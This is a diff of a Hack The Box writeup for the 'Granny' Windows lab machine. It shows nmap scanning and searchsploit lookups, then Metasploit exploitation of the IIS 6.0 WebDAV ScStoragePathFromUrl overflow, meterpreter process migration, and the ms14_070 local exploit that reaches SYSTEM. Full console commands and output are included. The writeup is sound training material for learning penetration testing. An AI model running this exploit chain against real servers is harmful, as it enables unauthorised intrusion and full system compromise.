@@ -2,10 +2,10 @@
 
 My First HtB writeup!
 
-This is an easy Windows box and a good one to start learning with. 
+This is an easy Windows box and a good one to start learning with. Granny's exploit path to SYSTEM can be achieved exclusively from Metasploit's public exploits and is good to learn basic Metasploit fucntinoality with.  
 
 
-## Nmap
+## Port Scanning with Nmap
 
 We start the CTF with an initial nmap scan to check for open ports/services (-sV) on default nmap ports and run default scripts (-sC) then output the results in all formats (-oA).
 ```
@@ -34,6 +34,8 @@ Nmap done: 1 IP address (1 host up) scanned in 14.63 seconds
 
 The only service we find open on granny is http running an old version of IIS (6.0) Let's pass this info into searchsploit to see if we have any vulnerabilities for this IIS version.
 
+
+# Searching for Exploits with searchsploit
 ```
 root@kali:~/htb/machines/completed/granny# searchsploit IIS 6.0
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
@@ -63,6 +65,8 @@ Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow        
 We can copy this file to our current directory with ```searchsploit -m windows/remote/41738.py```. This exploit acts as a PoC and only pops calc.exe. So, instead of editing the file, let's first check to see if there is a working exploit in Metasploit. Open up msfconsole then search for the exploit. We are returned with a module.
 
 ```
+
+# Getting a User Shell with Metasploit's iis_webdav_scstoragepathfromurl Module
 msf5 > search ScStoragePathFromUrl
 
 Matching Modules
@@ -142,17 +146,104 @@ meterpreter >
 
 Let's see if we can migrate our process to run Metasploit functions. We will background the session, try to migrate our process with post/windows/manage/migrate, set our session option, and migrate. We don't need to specify any other options here, Metasploit will take care of the rest with defaults.
 
+```
+
+#Process Migration and Shell Upgrade to SYSTEM
+meterpreter > bg
+[*] Backgrounding session 1...
+msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > use post/windows/manage/migrate 
+msf5 post(windows/manage/migrate) > set session 1
+session => 1
+msf5 post(windows/manage/migrate) > run
+
+[*] Running module against GRANNY
+[*] Current server process: rundll32.exe (3116)
+[*] Spawning notepad.exe process to migrate into
+[*] Spoofing PPID 0
+[*] Migrating into 2536
+[+] Successfully migrated into process 2536
+[*] Post module execution completed
+```
+
+Great, it looks like the migration worked. Let's check our session to see if we can run meterpreter commands.
+
+```
+msf5 post(windows/manage/migrate) > sessions 1
+[*] Starting interaction with 1...
+
+meterpreter > getuid
+Server username: NT AUTHORITY\NETWORK SERVICE
+```
+
+And we can. Next, we need to upgrade the shell to a system shell to own granny. We will see if Metasploit has any suggestions. 
+
+```
+meterpreter > bg
+[*] Backgrounding session 1...
+msf5 post(windows/manage/migrate) > use post/multi/recon/local_exploit_suggester 
+msf5 post(multi/recon/local_exploit_suggester) > options
+
+Module options (post/multi/recon/local_exploit_suggester):
+
+   Name             Current Setting  Required  Description
+   ----             ---------------  --------  -----------
+   SESSION                           yes       The session to run this module on
+   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits
+
+msf5 post(multi/recon/local_exploit_suggester) > set session 1
+session => 1
+msf5 post(multi/recon/local_exploit_suggester) > run
+
+[*] 10.10.10.15 - Collecting local exploits for x86/windows...
+[*] 10.10.10.15 - 30 exploit checks are being tried...
+[+] 10.10.10.15 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
+[+] 10.10.10.15 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
+[+] 10.10.10.15 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
+[+] 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
+[+] 10.10.10.15 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
+[+] 10.10.10.15 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
+[+] 10.10.10.15 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
+[*] Post module execution completed
+```
+
+the local_exloit_suggester module returns 7 possible exploits, but only 5 could be validated. Now we can run through the 5 exploits until we find one that works. We try ```exploit/windows/local/ms14_058_track_popup_menu``` but it does not work. On to the next one! 
+
+```
+msf5 post(exploit/windows/local/ms14_058_track_popup_menu) > use exploit/windows/local/ms14_070_tcpip_ioctl
+msf5 exploit(windows/local/ms14_070_tcpip_ioctl) > options
+
+Module options (exploit/windows/local/ms14_070_tcpip_ioctl):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION                   yes       The session to run this module on.
 
 
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows Server 2003 SP2
 
 
+msf5 exploit(windows/local/ms14_070_tcpip_ioctl) > set session 1
+session => 1
+msf5 exploit(windows/local/ms14_070_tcpip_ioctl) > run
 
+[*] Started reverse TCP handler on 192.168.132.128:4444 
+[*] Storing the shellcode in memory...
+[*] Triggering the vulnerability...
+[*] Checking privileges after exploitation...
+[+] Exploitation successful!
+[*] Exploit completed, but no session was created.
+msf5 exploit(windows/local/ms14_070_tcpip_ioctl) > sessions 1
+[*] Starting interaction with 1...
 
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+```
 
-
-
-
-
+Huzzah! We have achieved SYSTEM on HtB granny!
 
 
 
